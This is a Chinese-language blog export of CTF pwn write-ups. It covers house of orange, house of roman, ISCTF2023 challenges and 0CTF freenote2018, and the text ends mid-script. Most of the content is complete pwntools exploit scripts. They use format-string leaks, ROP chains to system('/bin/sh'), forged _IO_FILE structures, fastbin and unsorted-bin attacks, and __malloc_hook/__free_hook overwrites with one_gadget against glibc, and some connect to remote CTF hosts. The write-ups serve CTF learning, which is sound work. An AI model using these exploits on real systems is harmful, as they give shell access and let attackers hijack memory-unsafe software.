temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1]; /*  char* _save_gptr;  char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;\n可以按照如下伪造\n#house of orange#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串  fake_file = b&#x27;/bin/sh\\x00&#x27; #flags,也是最后__overflow调用的参数fake_file += p64(0x61)     #size为0x61，被放入small_bin，从而对应了chain指针fake_file += p64(0) + p64(io_list_all - 0x10)#unsorted bin attack，修改_IO_list_all为main_arena+88fake_file += p64(0) + p64(1)  #_IO_write_base &lt; _IO_write_ptrfake_file += b&#x27;\\x00&#x27;*0x90     #填充中间(从_IO_write_end后到_mode)（对利用）无用的数据fake_file += p64(0)       #_mode &lt;= 0fake_file += b&#x27;\\x00&#x27;*0x10 #_unused2 fake_file += p64(heap_base + 0x120)   #the offset byte of vtablefake_file += p64(0)*3 fake_file += p64(system)#__overflow payload = b&#x27;a&#x27;*0x10 payload += fake_file\n注意该攻击手段仅适用于2.23及2.23以前,但是其在无free的情况下造成free的手段可以使用来看个例题吧[SWPUCTF 2021 新生赛]NSS_printer_IIchecksec\n└─$ checksec printer[*] &#x27;/mnt/Desktop/printer&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nmain函数内存在一次base编码，具体不赘述存在格式化字符串漏洞，可以泄露libc和heap只有增，删改查都没有\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3; // [rsp+8h] [rbp-E8h]  unsigned int size; // [rsp+Ch] [rbp-E4h]  char *format; // [rsp+18h] [rbp-D8h]  char s1[32]; // [rsp+20h] [rbp-D0h] BYREF  char v7[32]; // [rsp+40h] [rbp-B0h] BYREF  char v8[136]; // [rsp+60h] [rbp-90h] BYREF  unsigned __int64 v9; // [rsp+E8h] [rbp-8h]  v9 = __readfsqword(0x28u);  init(argc, argv, envp);  v3 = 0;  while ( 1 )  &#123;    do    &#123;      printf(&quot;username = &quot;);      gets(s1);      printf(&quot;password = &quot;);      gets(v7);      ++v3;      base64_encode(v7, (__int64)v8);    &#125;    while ( strcmp(s1, &quot;NSSCTF&quot;) );    if ( !strcmp(v8, &quot;Z=FZJhKU5jPQ3jC65I86F0Kb&quot;) )    &#123;      puts(&quot;Hello, welcome to NSS printer&quot;);      while ( 1 )      &#123;        printf(&quot;lens of your word: &quot;);        size = read_num();        if ( size &gt; 0x1000 )          break;        format = (char *)malloc(size);        printf(&quot;input what you want to say: &quot;);        gets(format);        printf(&quot;you said: &quot;);        printf(format);        putchar(10);      &#125;      puts(&quot;too long&quot;);      exit(1);    &#125;  &#125;&#125;\n难点就是如何在没有free的情况下free掉一个chunk，使其进入unsortedbin，以完成稍后的利用\nfrom pwn import *from LibcSearcher import*from ctypes import *from struct import packcontext(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()#p = process([&quot;./printer&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 29000)p.sendlineafter(&quot;username = &quot;, &quot;NSSCTF\\x00&quot;)p.sendlineafter(&quot;password = &quot;, &quot;NSSCTF&#123;b@se_xx_64&#125;\\x00&quot;)def attack(size, content):    p.sendlineafter(&quot;word: &quot;, str(size))    p.sendlineafter(&quot;say: &quot;, content)pl = b&#x27;%37$p.%33$p.%9$p&#x27; + p64(0) + p64(0xfe1)attack(0x10, pl)#fmtp.recvuntil(&#x27;0x&#x27;)libc_start_main_addr = int((p.recv(12)),16) - 240p.recvuntil(&#x27;0x&#x27;)pro_base = int((p.recv(12)),16) - 0xa10p.recvuntil(&#x27;0x&#x27;)heap_base = int((p.recv(12)),16) - 0x10libc = ELF(&#x27;./libc.so.6&#x27;) #2.23-0ubuntu11.3_amd64libc_base = libc_start_main_addr - libc.sym[&#x27;__libc_start_main&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]io_list_all = libc_base + libc.sym[&#x27;_IO_list_all&#x27;]success(&quot;libc:%s&quot;,hex(libc_base))success(&quot;system:%s&quot;,hex(system))success(&quot;heap_base:%s&quot;,hex(heap_base))#--------house of orange--------#debug()attack(0x1000, b&#x27;aaaaa&#x27;) #----- 修改Top Chunk得到一个Free chunk ##本地debug过不去，但是ida反编译和靶机环境都可以申请到0x1000的chunk#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串  fake_file = b&#x27;/bin/sh\\x00&#x27; #flags,也是最后__overflow调用的参数fake_file += p64(0x61)  #size作为0x61，被放入small_bin，从而对应了chain指针fake_file += p64(0) + p64(io_list_all - 0x10)#unsorted bin attack，修改_IO_list_all为main_arena+88fake_file += p64(0) + p64(1)  #_IO_write_base &lt; _IO_write_ptrfake_file += b&#x27;\\x00&#x27;*0x90     #填充中间(从_IO_write_end后到_mode)（对利用）无用的数据fake_file += p64(0)       #_mode &lt;= 0fake_file += b&#x27;\\x00&#x27;*0x10 #_unused2 fake_file += p64(heap_base + 0x120)   #the offset byte of vtablefake_file += p64(0)*3 fake_file += p64(system)#__overflow payload = b&#x27;a&#x27;*0x10 payload += fake_fileattack(0x10, payload)p.sendlineafter(&quot;word: &quot;, str(0x10))p.interactive()\n报了一堆错，但是弹了一个shell需要多打几次\n[DEBUG] Received 0x4b bytes:    b&quot;*** Error in `./pwn5&#x27;: malloc(): memory corruption: 0x00007f3d936e6520 ***\\n&quot;*** Error in `./pwn5&#x27;: malloc(): memory corruption: 0x00007f3d936e6520 ***[DEBUG] Received 0x178 bytes:    b&#x27;======= Backtrace: =========\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f3d933987f5]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7f3d933a315e]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3d933a51d4]\\n&#x27;    b&#x27;./pwn5(+0xfc0)[0x55dc9c804fc0]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3d93341840]\\n&#x27;    b&#x27;./pwn5(+0xa39)[0x55dc9c804a39]\\n&#x27;    b&#x27;======= Memory map: ========\\n&#x27;======= Backtrace: =========/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f3d933987f5]/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7f3d933a315e]/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3d933a51d4]./pwn5(+0xfc0)[0x55dc9c804fc0]/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3d93341840]./pwn5(+0xa39)[0x55dc9c804a39]======= Memory map: ========$\n\n第一次复现如此巧妙的攻击手法，喵喵喵前面的例题，以后再来探索吧\n","categories":["heap"],"tags":["_IO_FILE"]},{"title":"ISCTF_pwn","url":"/2023/12/02/ISCTF-pwn/","content":"非常好比赛，使我的脑袋旋转ISCTF_pwn附件ISCTF_wp_written_by_Hor1zon[ISCTF2023 ezpie]checksec主要难点是pie看看main有个格式化字符串漏洞，因为开了pie考虑泄露程序基址恰好此处能泄露func的地址\np.send(b&#x27;b&#x27;*(40-3) + b&#x27;v5:&#x27;)# pause()p.recvuntil(b&#x27;v5:&#x27;)v5 = u64(p.recvuntil(b&#x27;\\x0a&#x27;, drop=True) + b&#x27;\\0\\0&#x27;)success(&#x27;func_addr: %s&#x27;+ hex(func_addr))code_base = func_addr - elf.sym[&#x27;func&#x27;]success(&quot;code_base: %s&quot;,hex(code_base) )\n顺带着很多东西就能用了,\npop_rdi_ret =code_base + 0x0000000000001333pop_rsi_r15_ret =code_base + 0x0000000000001331ret_addr =code_base + 0x000000000000101aleave_ret =code_base + 0x0000000000001252  # : leave; ret; str_bin_sh =code_base + 0x0000000000002008pop_rax_ret =code_base + 0x00000000000012c8puts_got = code_base + elf.got[&#x27;puts&#x27;]puts_plt = code_base + elf.plt[&#x27;puts&#x27;]main_addr = code_base + elf.sym[&#x27;main&#x27;]syscall = code_base + 0x00000000000012c5pop_all = code_base+ 0x000000000000132cogg = code_base+0xe3afeogg2 = code_base +0xe3b01ogg3 = code_base+0xe3b04\nfunc内有处溢出，溢出空间蛮大的程序内有syscall和bin_sh字符串，应该是可以ret2syscall的，比较懒，打ret2libc这里用的是LibcSearcher,个人推荐把sgtlibc也装上，有时候libc版本能互补，用法可参考山石夏令营的结营赛wp\npayload2  = b&#x27;a&#x27; * 0x50 + b&#x27;b&#x27; * 8  +p64(pop_rdi_ret)+p64(puts_got) + p64(puts_plt)+ p64(main_addr)p.recvuntil(b&quot;please enter your information-&gt;&quot;)p.sendline(payload2)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&#x27;puts: %s&#x27;,puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)#9 - libc6_2.31-0ubuntu9.9_amd64libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)one_gadget = libc_base + 0xe3afe#尝试过其他几个，貌似只有这个能打p.send(&#x27;fxxkingpie&#x27;)payload3  = b&#x27;a&#x27; * (0x50 + 0x8)payload3 += p64(ret_addr)payload3 += p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)#payload3 += p64(pop_all) + p64(one_gadget)p.sendline(payload3)p.interactive()\n想打ret2one_gadget的话也要先泄露libc版本，实测能打完整exp如下\nfrom pwn import*from pwn import p64,u64#import sgtlibcfrom LibcSearcher import*elf=ELF(&#x27;./ezpie&#x27;)#libc = ELF(&#x27;/home/str1d3r/glibc-all-in-one/libs/2.31-0ubuntu9.12_amd64/libc.so.6&#x27;)context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()p = remote(&#x27;43.249.195.138&#x27;,20012)#libc =ELF(&#x27;libc-2.31.so&#x27;)#p = process(&quot;./ezpie&quot;)#debug()p.send(b&#x27;b&#x27;*(40-3) + b&#x27;v5:&#x27;)# pause()p.recvuntil(b&#x27;v5:&#x27;)v5 = u64(p.recvuntil(b&#x27;\\x0a&#x27;, drop=True) + b&#x27;\\0\\0&#x27;)success(&#x27;v5: &#x27;+ hex(v5))code_base = v5 - elf.sym[&#x27;func&#x27;]success(&quot;code_base: %s&quot;,hex(code_base) )pop_rdi_ret =code_base + 0x0000000000001333pop_rsi_r15_ret =code_base + 0x0000000000001331ret_addr =code_base + 0x000000000000101aleave_ret =code_base + 0x0000000000001252  # : leave; ret; str_bin_sh =code_base + 0x0000000000002008pop_rax_ret =code_base + 0x00000000000012c8puts_got = code_base + elf.got[&#x27;puts&#x27;]puts_plt = code_base + elf.plt[&#x27;puts&#x27;]main_addr = code_base + elf.sym[&#x27;main&#x27;]syscall = code_base + 0x00000000000012c5pop_all = code_base+ 0x000000000000132cogg = code_base+0xe3afeogg2 = code_base +0xe3b01ogg3 = code_base+0xe3b04payload2  = b&#x27;a&#x27; * 0x50 + b&#x27;b&#x27; * 8  +p64(pop_rdi_ret)+p64(puts_got) + p64(puts_plt)+ p64(main_addr)p.recvuntil(b&quot;please enter your information-&gt;&quot;)p.sendline(payload2)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&#x27;puts: %s&#x27;,puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)#9 - libc6_2.31-0ubuntu9.9_amd64libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)one_gadget = libc_base + 0xe3afe#尝试过其他几个，貌似只有这个能打p.send(&#x27;fxxkingpie&#x27;)payload3  = b&#x27;a&#x27; * (0x50 + 0x8)payload3 += p64(ret_addr)payload3 += p64(pop_rdi_ret) + p64(bin_sh) + p64(system)+ p64(ret_addr)#payload3 += p64(pop_all) + p64(one_gadget)p.sendline(payload3)p.interactive()\n\n[ISCTF2023 stack]checksec直接看vuln函数  一开始以为是类似于off-by-one的漏洞，一直陷入了误区实际上就是单纯的溢出，但是我们像平时一样测试溢出时，会导致数组s[i]的下标i被覆盖，比如我们使用这样的exp测试\nfrom pwn import *elf = ELF(&#x27;./stack&#x27;)p = process(&#x27;./stack&#x27;)context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()ret = 0x000000000040101apop_rbp_ret = 0x00000000004011bdleave_ret = 0x00000000004012e4size = b&#x27;1000&#x27;p.recvuntil(b&quot;size: &quot;)p.sendline(size)pay = cyclic(80)p.send(pay)debug()p.interactive()\n会导致数组写入时出现其原因为数组下标i被b’a’覆盖，实际上数据就被读入到了s[61]处，导致我们无法覆盖返回地址这里我们找准i的偏移，并在合适的时候填写正确的数组下标，防止其被覆盖，我们就能正常溢出覆盖返回地址\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()elf = ELF(&#x27;./stack&#x27;)#p = process(&#x27;./stack&#x27;)p = remote(&#x27;43.249.195.138&#x27;, 22555)ret = 0x000000000040101ap.sendline(b&#x27;10000&#x27;)payload = b&#x27;a&#x27;*28payload += b&#x27;\\x1d&#x27;payload += b&#x27;\\x00&#x27;*2payload += p64(ret)payload += p64(ret)payload += p64(elf.sym[&#x27;backdoor&#x27;])p.send(payload)p.interactive()\n[ISCTF2023 fmt]纯纯的纸老虎checksec保护全开，别被吓到，抓住关键点把v1,v2改了就能拿到shell，根本不用溢出 &#x3D; NX和canary没用，根本不用改got表 &#x3D; full-relro没用，开了pie &#x3D; 偏移一定格式化字符串直接改就行\nfrom pwn import *elf = ELF(&#x27;./fmt&#x27;)p = process(&#x27;./fmt&#x27;)context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()main = b&#x27;%26$p&#x27;canary =b&#x27;%27$p&#x27;offset = 10debug()pay = &#x27;aaaaaaaaaaaaaaaaaa%8$nbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb%9$n&#x27;p.send(pay)p.interactive()&#x27;&#x27;&#x27;#!/usr/bin/python3# 格式化符号说明%x 以十六进制打印，只能打印4字节，一般只用于32位%p 打印目标地址，建议32位和64位都用这个%s 打印地址内容%c 打印单个字符%hhn 写一字节%hn  写两字节%n   写四字节%ln  32位写四字节，64位写八字节%lln 写八字节&#x27;&#x27;&#x27;\n[ISCTF2023 fries]checksec主要漏洞点在format函数，给了7次啊7次格式化字符串漏洞利用机会第一次泄露elfbase，第二次泄露puts地址和libc_base,第三次把ret地址改成one_gadget\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)p = process(&#x27;./fries&#x27;)#p = remote(&#x27;43.249.195.138&#x27;,21702)libc = ELF(&#x27;libc.so.6&#x27;)def debug():    gdb.attach(p)    pause()p.recvuntil(&#x27;Emmmmm... Could you give me some fries\\n&#x27;)p.sendline(&#x27;fries\\x00&#x27;)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(b&#x27;%10$p%24$p&#x27;)x= int(p.recv(14),16)elf_base = x-16416elf.address = elf_basestack= int(p.recv(14),16)ret = stack - 72pay = b&#x27;%9$s&#x27;pay += (8 - (len(pay) % 8)) * b&#x27;A&#x27;pay += p64(elf.got[&#x27;puts&#x27;])p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(pay)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&#x27;puts: %s&#x27;,puts_addr)libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]ogg = [0x50a47,0xebc81,0xebc85,0xebc88,0xebce2,0xebd3f,0xebd43]og = libc_base + ogg[0]o1 = og &amp;0xFFFFFFFFo2 = (og &gt;&gt; 32)&amp;0xFFFFFFFFsuccess(&#x27;libc_base: %s&#x27;,libc_base)pay = fmtstr_payload(8,&#123;ret:o1&#125;,write_size=&#x27;short&#x27;)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(pay)pay = fmtstr_payload(8,&#123;ret+4:o2&#125;,write_size=&#x27;short&#x27;)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(pay)p.recvuntil(&#x27;Go get some fries on the pier\\n&#x27;)p.sendline(&#x27;\\x00\\x00\\x00\\x00&#x27;)for i in range(4):    p.sendline(&#x27;ls\\x00&#x27;)p.interactive()\n[ISCTF2023 touch_file1]?\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)p=remote(&#x27;43.249.195.138&#x27;,21284)p.sendline(b&#x27;test\\ncat flag\\n&#x27;)p.interactive()\n[ISCTF2023 touch_file2]一道glibc2.31的删符号表的cpp堆题太抽象了:(存个exp就跑\nfrom pwn import *context(os=&#x27;Linux&#x27;,arch = &#x27;amd64&#x27;,log_level =&#x27;debug&#x27;)p = process(&#x27;./touch_file2&#x27;)#p = remote(&#x27;43.249.195.138&#x27;,22475)def add(name):    p.recvuntil(&#x27;&gt;&#x27;)    p.send(&#x27;touch &#x27;)    p.sendline(name)def edit(name,text):    p.recvuntil(&#x27;&gt;&#x27;)    p.send(&#x27;edit &#x27;)    p.send(name)    p.send(&#x27; &#x27;)    p.sendline(text)def rm(name):    p.recvuntil(&#x27;&gt;&#x27;)    p.send(&#x27;rm &#x27;)    p.sendline(name)for i in range(8):    add(str(i))#rm(&#x27;1&#x27;)p.recvuntil(&#x27;&gt;&#x27;)p.sendline(&#x27;cp 0 8\\n&#x27;)p.sendline(&#x27;cp 1 9\\n&#x27;)for i in range(8-1,-1,-1):    rm(str(i))p.recvuntil(&#x27;&gt;&#x27;)p.sendline(&#x27;cat 8&#x27;)p.recvuntil(&#x27;file_content is &#x27;)x = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_base = x -3390432 + 1372160libc = elf.libc__free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]edit(&#x27;9&#x27;,p64(__free_hook))success(&#x27;libc_base:%s&#x27;,hex(libc_base))add(&#x27;yy /bin/sh\\x00&#x27;)add(b&#x27;tt &#x27;+p64(system))rm(&#x27;yy&#x27;)p.interactive()","categories":["wp"],"tags":["wp"]},{"title":"house_of_roman","url":"/2023/11/15/house-of-roman/","content":"刷how2heap的时候看到的一个好玩的打法，本地环境貌似复现不起来，仅作记录程序来源https://github.com/romanking98/House-Of-RomanHouse-Of-RomanRCE through Leakless HeapFengShui, fastbin alloc anywhere.Was presented at DEFCON 26.\n[House-Of-Roman]new_chall开局有个能写入bss段的机会bss实现了增删改malloc_chunk，没有限制size，只能申请19个chunk\n__int64 malloc_chunk()&#123;  unsigned int v1; // [rsp+0h] [rbp-10h] BYREF  _DWORD size[3]; // [rsp+4h] [rbp-Ch] BYREF  printf(&quot;Enter size of chunk :&quot;);  __isoc99_scanf(&quot;%d&quot;, size);  printf(&quot;Enter index :&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0x13 )  &#123;    *(_QWORD *)&amp;size[1] = malloc(size[0]);    heap_ptrs[v1] = *(_QWORD *)&amp;size[1];    sizes[v1] = size[0];    return *(_QWORD *)&amp;size[1];  &#125;  else  &#123;    puts(&quot;Invalid index&quot;);    return 0LL;  &#125;&#125;\nwrite_chunk,存在off_by_one漏洞\nint write_chunk()&#123;  unsigned int v1; // [rsp+8h] [rbp-8h] BYREF  int v2; // [rsp+Ch] [rbp-4h]  printf(&quot;\\nEnter index of chunk :&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &gt; 0x13 )    return puts(&quot;\\nInvalid index&quot;);  if ( !heap_ptrs[v1] )    return puts(&quot;Bad index&quot;);  v2 = sizes[v1];  printf(&quot;Enter data :&quot;);  return read(0, (void *)heap_ptrs[v1], v2 + 1);//off_by_one&#125;\nfree_chunk存在UAF\nvoid free_chunk()&#123;  unsigned int v0; // [rsp+Ch] [rbp-4h] BYREF  printf(&quot;\\nEnter index :&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v0);  if ( v0 &lt;= 0x13 )    free((void *)heap_ptrs[v0]);&#125;\n\nexp解说链接:https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc\nfrom pwn import *from pwn import p64p = process(&quot;./new_chall&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.24.so&quot;&#125;)#raw_input()def debug():\tgdb.attach(p)\tpause()def menu():\tp.recvuntil(b&quot;3. Free&quot;)def create(size,idx):\tmenu()\tp.sendline(b&quot;1&quot;)\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(size))\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(idx))def free(idx):\tmenu()\tp.sendline(b&quot;3&quot;)\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(idx))def edit(idx,data):\tmenu()\tp.sendline(b&quot;2&quot;)\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(idx))\tsleep(0.1)\tp.send(data)name = b&quot;A&quot;*20p.recvlineuntil(b&quot;Enter name :&quot;)p.sendline(name)debug()create(24,0)create(200,1)fake = b&quot;A&quot;*104fake += p64(0x61)edit(1,fake)create(101,2)free(1)create(200,1)over = b&quot;A&quot;*24over += b&quot;\\x71&quot;edit(0,over)create(101,3)create(101,15)create(101,16)create(101,17)create(101,18)create(101,19)free(2)free(3)heap_po = b&quot;\\x20&quot;edit(3,heap_po)arena_po = b&quot;\\xcd\\x4a&quot;edit(1,arena_po)#raw_input()create(101,0)create(101,0)create(101,0)#p.interactive()# Control arena through 0.# Now unsorted bin attack.# First fix 0x71 freelist.free(15)edit(15,p64(0x00))# Fixed.# 0x7f702619777bcreate(200,1)create(200,1)create(24,2)create(200,3)create(200,4)free(1)po = b&quot;B&quot;*8po += b&quot;\\xe0\\x4a&quot;edit(1,po)create(200,1)#5b394fover = b&quot;R&quot;*19over += b&quot;\\x4f\\x39\\x5b&quot;edit(0,over)create(200,7)try:\tresp = p.recv(4, timeout=6)\tp.interactive()except:\tp.close()\n\n该方法在aslr开启下需要爆破数据，看运气以下方法来自https://xz.aliyun.com/t/7426#toc-1用IO_FILE泄露了libc地址，有1&#x2F;16的概率打通\n#coding:utf8from pwn import*def add(size,idx):    #p.sendline(&quot;1&quot;)    #p.sendline(str(size))    #p.sendline(str(idx))    p.sendlineafter(&#x27;Free&#x27;,&quot;1&quot;)    p.sendlineafter(&#x27;Enter size of chunk :&#x27;,str(size))    p.sendlineafter(&#x27;Enter index :&#x27;,str(idx))def free(idx):    p.sendlineafter(&#x27;Free&#x27;,&quot;3&quot;)    p.sendlineafter(&#x27;Enter index :&#x27;,str(idx))def edit(idx,data):    #p.recvuntil(&#x27;Free&#x27;)    #p.sendline(&#x27;2&#x27;)    #p.recvuntil(&#x27;Enter index of chunk :&#x27;)    #p.sendline(str(idx))    #p.recvuntil(&#x27;Enter data :&#x27;)    #p.send(data)    p.sendlineafter(&#x27;Free&#x27;,&quot;2&quot;)    p.sendlineafter(&#x27;Enter index of chunk :&#x27;,str(idx))    p.sendafter(&#x27;Enter data :&#x27;,data)p = process(&#x27;./new_chall&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;,checksec=False)context.log_level =&#x27;DEBUG&#x27;p.sendlineafter(&#x27;Enter name :&#x27;,&#x27;FMYY&#x27;)add(0x18,0)add(0xC8,1)add(0x68,2)edit(1,&#x27;\\x00&#x27;*0x68 + p64(0x61))free(1)add(0xC8,1)add(0x68,3)add(0x68,4)add(0x68,5)edit(0,&#x27;\\x00&#x27;*0x18 + &#x27;\\x71&#x27;)free(2)free(3)edit(3,&#x27;\\x20&#x27;)edit(1,&#x27;\\xDD\\x25&#x27;)add(0x68,9)add(0x68,9)payload = &#x27;\\x00&#x27;*0x33 + p64(0xFBAD1800) + p64(0)*3 + &#x27;\\x88&#x27;add(0x68,9)edit(9,payload)#修改stdout的flag位为0xfbad1800#bing将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;).ljust(8,&#x27;\\x00&#x27;)) - libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]libc.address = libc_basefree(4)edit(4,p64(0))add(0x68,0)free(0)edit(0,p64(libc.symbols[&#x27;__malloc_hook&#x27;] - 0x23))add(0x68,0)add(0x68,0)p.sendlineafter(&#x27;Free&#x27;,&#x27;2&#x27;)p.sendlineafter(&#x27;Enter index of chunk :&#x27;,&#x27;0&#x27;)p.send(&#x27;\\x00&#x27;*0x13+p64(libc_base+0xF02A4))#向malloc_hook 地址里写入 onegadget #free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。free(1)free(1)p.interactive()\n\n#[0CTF&#x2F;TCTF 2018 finals]freenote2018增删改（查只是个壳子）init_note 限制了15个chunk，size为0x1到0x100\n__int64 sub_B4E()&#123;  unsigned int v1; // [rsp+Ch] [rbp-124h]  unsigned int v2; // [rsp+10h] [rbp-120h]  int v3; // [rsp+14h] [rbp-11Ch]  void *dest; // [rsp+18h] [rbp-118h]  char buf[264]; // [rsp+20h] [rbp-110h] BYREF  unsigned __int64 v6; // [rsp+128h] [rbp-8h]  v6 = __readfsqword(0x28u);  v1 = 0;  if ( (unsigned int)dword_20203C &lt;= 0xF &amp;&amp; (printf(&quot;Input the note length:&quot;), v3 = sub_A80(), v3 &gt; 0) &amp;&amp; v3 &lt;= 256 )  &#123;    printf(&quot;Input the note content:&quot;);    v2 = read(0, buf, 0xFFuLL);    if ( v2 &gt; v3 )      v2 = v3;    dest = malloc(v3 + 8);    if ( dest &amp;&amp; v2 )      memcpy(dest, buf, v2 - 1);    while ( dword_202048[4 * v1] )      ++v1;    *((_QWORD *)&amp;unk_202040 + 2 * (int)v1) = dest;    dword_202048[4 * v1] = v3;    ++dword_20203C;    printf(&quot;Here is your label: %d\\n&quot;, v1);    puts(&quot;Done~!&quot;);    return 0LL;  &#125;  else  &#123;    puts(&quot;Not allow~!&quot;);    return 1LL;  &#125;&#125;\nedit没有溢出\n__int64 sub_D43()&#123;  unsigned int v1; // [rsp+8h] [rbp-8h]  printf(&quot;Input the note index:&quot;);  v1 = sub_A80();  if ( v1 &lt; 0x11 &amp;&amp; dword_202048[4 * v1] )  &#123;    printf(&quot;Input the note content:&quot;);    read(0, *((void **)&amp;unk_202040 + 2 * (int)v1), (unsigned int)dword_202048[4 * v1]);    puts(&quot;Done~!&quot;);    return 0LL;  &#125;  else  &#123;    puts(&quot;Not allow~!&quot;);    return 1LL;  &#125;&#125;\nfree存在UAF\n__int64 sub_E1E()&#123;  unsigned int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;Input the note index:&quot;);  v1 = sub_A80();  if ( v1 &lt; 0x11 &amp;&amp; dword_202048[4 * v1] )  &#123;    free(*((void **)&amp;unk_202040 + 2 * (int)v1));    puts(&quot;Done~!&quot;);    return 0LL;  &#125;  else  &#123;    puts(&quot;Not allow~!&quot;);    return 1LL;  &#125;&#125;\nHouse of roman，需要爆破12bits的数据堆风水呜呜呜\nfrom pwn import *import tracebackdef init_note(size, content):    p.sendlineafter(&#x27;Choice:&#x27;, &#x27;1&#x27;)    p.sendlineafter(&#x27;Input the note length:&#x27;, str(size))    p.sendafter(&#x27;Input the note content:&#x27;, content)def edit_note(index, size, content):    p.sendlineafter(&#x27;Choice:&#x27;, &#x27;2&#x27;)    p.sendlineafter(&#x27;Input the note index:&#x27;, str(index))    p.sendafter(&#x27;Input the note content:&#x27;, content)def free_note(index):    p.sendlineafter(&#x27;Choice:&#x27;, &#x27;3&#x27;)    p.sendlineafter(&#x27;Input the note index:&#x27;, str(index))with context.quiet:    try_count = 0    # since we are replacing some addresses partially, and ASLR is enabled    # we are executing the program over and over again until we get lucky    while True:        try:            try_count += 1            print (sys.stderr, &#x27;Try #&#123;&#125;&#x27;.format(try_count))            #p = process(&#x27;./program&#x27;, env = &#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.23.so&#x27;&#125;)            p = remote(&quot;192.168.63.133&quot;, 10001)            # chunk#0 (0x81)            init_note(0x68, &#x27;a&#x27; * 255)            # chunk#1 (0x81)            init_note(0x68, &#x27;b&#x27; * 255)            # chunk#2 (0x91)            init_note(0x78, &#x27;c&#x27; * 255)            # chunk#3 (0x71)            init_note(0x60, &#x27;d&#x27; * 255)            # chunk#4 (0x71)            init_note(0x60, &#x27;e&#x27; * 255)            # launch double free attack            # fastbin free list (0x80): chunk#0 --&gt; chunk#1 --&gt; chunk#0            free_note(0)            free_note(1)            free_note(0)            # chunk#5 (0x81)            # this chunk is co-located with chunk#0, so we partially overwrite the fd pointer            init_note(0x68, p8(0xe0) + b&#x27;\\n&#x27;)            # chunk#6 (0x81)            # this chunk is co-located with chunk#1            init_note(0x68, b&#x27;b&#x27; * 0x50 + p64(0) + 